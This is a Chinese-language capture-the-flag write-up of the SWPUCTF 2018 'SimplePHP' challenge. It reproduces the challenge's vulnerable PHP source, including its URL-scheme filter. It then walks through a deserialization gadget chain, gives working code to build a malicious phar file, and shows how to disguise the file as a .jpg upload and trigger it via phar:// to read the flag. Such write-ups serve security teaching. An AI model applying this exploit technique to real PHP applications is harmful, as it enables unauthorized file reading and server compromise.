[TOC]

## [SWPUCTF 2018]SimplePHP

首先打开主页，发现有几个功能：

![image-20230323150613411](https://s2.loli.net/2023/03/23/CMBmpzwcXaZ75rs.png)

有一个查看文件，和一个上传文件。

![image-20230323150656909](https://s2.loli.net/2023/03/23/tR2GCZFq3sQfbj6.png)

在查看文件中可以进行文件包含，读取出相关的php代码内容

我们通过读取`file.php`，一步一步读取出了6个php文件，由于有3个没用，所以我只放了三个文件出来



### 源代码



class.php

```php
 <?php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
    public function __set($key,$value)
    {
        $this->$key = $value;
    }
    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
        
    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
?> 
```



file.php

```php
<?php 
header("content-type:text/html;charset=utf-8");  
include 'function.php'; 
include 'class.php'; 
ini_set('open_basedir','/var/www/html/'); 
$file = $_GET["file"] ? $_GET['file'] : ""; 
if(empty($file)) { 
    echo "<h2>There is no file to show!<h2/>"; 
} 
$show = new Show(); 
if(file_exists($file)) { 
    $show->source = $file; 
    $show->_show(); 
} else if (!empty($file)){ 
    die('file doesn\'t exists.'); 
} 
?> 
```



function.php

```php
<?php 
//show_source(__FILE__); 
include "base.php"; 
header("Content-type: text/html;charset=utf-8"); 
error_reporting(0); 
function upload_file_do() { 
    global $_FILES; 
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg"; 
    //mkdir("upload",0777); 
    if(file_exists("upload/" . $filename)) { 
        unlink($filename); 
    } 
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename); 
    echo '<script type="text/javascript">alert("上传成功!");</script>'; 
} 
function upload_file() { 
    global $_FILES; 
    if(upload_file_check()) { 
        upload_file_do(); 
    } 
} 
function upload_file_check() { 
    global $_FILES; 
    $allowed_types = array("gif","jpeg","jpg","png"); 
    $temp = explode(".",$_FILES["file"]["name"]); 
    $extension = end($temp); 
    if(empty($extension)) { 
        //echo "<h4>请选择上传的文件:" . "<h4/>"; 
    } 
    else{ 
        if(in_array($extension,$allowed_types)) { 
            return true; 
        } 
        else { 
            echo '<script type="text/javascript">alert("Invalid file!");</script>'; 
            return false; 
        } 
    } 
} 
?> 
```



### 分析

仔细分析代码，发现只用这里能够读取到flag：

Test类

```php
public function file_get($value)
{
    $text = base64_encode(file_get_contents($value));
    return $text;
}
```

我们仔细分析一下Test类：

```php
class Test
{
    public $file;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __get($key)
    {
        return $this->get($key);
    }
    public function get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}
```

我们发现有这样一条链：`__get($key)=>get($key)=>file_get($value)`

我们可以通过调用 `__get($key)`方法，逐步传参，然后获得$value使用file_get_contents()函数取出flag。但是我们想要让 `$value="/var/www/html/f1ag.php"`

需要让变量 $params变为一个数组，我们先假设数组为：`$params=array('source'=>'/var/www/html/f1ag.php')`

但是我们如何才能调用 `__get()方法`呢，这是一个魔术方法，当我们访问通过该类对象调用一个不存在的属性时，就会自动调用该方法。

我们接下来观察一下Show类：

```php
class Show
{
    public $source;
    public $str;
    public function __construct($file)
    {
        $this->source = $file;   //$this->source = phar://phar.jpg
        echo $this->source;
    }
    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }
}
```

我们观察一下 `__toString()`方法，我们发现：

`$content = $this->str['str']->source;`

并且在方法`__construct()`中提示我们使用`phar://伪协议`

所以，此处我们应该让 `$this->str['str']`设为Test对象，这样的话，Test对象就会调用一个不存在的属性：source，就会调用Test类魔术方法`__get()`，从而获得flag

但是怎样才能让Show对象调用`__toString()`方法？

我们观察一下C1e4r这个类：

```php
class C1e4r
{
    public $test;
    public $str;
    public function __construct($name)
    {
        $this->str = $name;
    }
    public function __destruct()
    {
        $this->test = $this->str;
        echo $this->test;
    }
}
```

如果我们设置 $str变量为Show类对象，这样就可以调用Show类对象的`__toString()`方法了

通过以上分析，我们可以写如下代码构造：

```php
<?php

class C1e4r {
    public $test;
    public $str;
}

class Show {
    public $source;
    public $str;
}

class Test {
    public $file;
    public $params = array('source'=>'/var/www/html/f1ag.php');
}

$c = new C1e4r();
$s = new Show();
$t = new Test();
$s->str['str'] = $t;
$c->str=$s;
echo serialize($c);
$phar = new Phar('exp.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata($c);
$phar->addFromString("test.txt","test");
$phar->stopBuffering();
```

生成phar文件：`exp.phar`

根据文件上传检查函数：

```php
function upload_file_check() {
    global $_FILES;
    $allowed_types = array("gif","jpeg","jpg","png");
    $temp = explode(".",$_FILES["file"]["name"]);
    $extension = end($temp);
    if(empty($extension)) {
        //echo "<h4>请选择上传的文件:" . "<h4/>";
    }
    else{
        if(in_array($extension,$allowed_types)) {
            return true;
        }
        else {
            echo '<script type="text/javascript">alert("Invalid file!");</script>';
            return false;
        }
    }
}
```

我们可以将文件后缀改为: `jpg`进行绕过

上传之后会进行重命名：

```php
function upload_file_do() {
    global $_FILES;
    $filename = md5($_FILES["file"]["name"].$_SERVER["REMOTE_ADDR"]).".jpg";
    //mkdir("upload",0777);
    if(file_exists("upload/" . $filename)) {
        unlink($filename);
    }
    move_uploaded_file($_FILES["file"]["tmp_name"],"upload/" . $filename);
    echo '<script type="text/javascript">alert("上传成功!");</script>';
}
```

文件名重新编码，通过`文件名+ip地址`进行md5编码，

我们可以访问 `/upload` 获取上传文件名：

![image-20230323163624046](https://s2.loli.net/2023/03/23/VWgJOaCE2RvmAId.png)

我们观察一下：file.php

```php
<?php
header("content-type:text/html;charset=utf-8");
include 'function.php';
include 'class.php';
ini_set('open_basedir','/var/www/html/');
$file = $_GET["file"] ? $_GET['file'] : "";
if(empty($file)) {
    echo "<h2>There is no file to show!<h2/>";
}
$show = new Show();
if(file_exists($file)) {
    $show->source = $file;
    $show->_show();
} else if (!empty($file)){
    die('file doesn\'t exists.');
}
?>
```

这里我们注意到了 `file_exists()函数`，配合`phar://伪协议`和phar文件可以实现反序列化，然后输出 flag的base64编码

我们直接使用：

```php
phar://upload/文件名
```

![image-20230323163930699](https://s2.loli.net/2023/03/23/qZ6nSL1z3mJMkVK.png)

解密获得flag



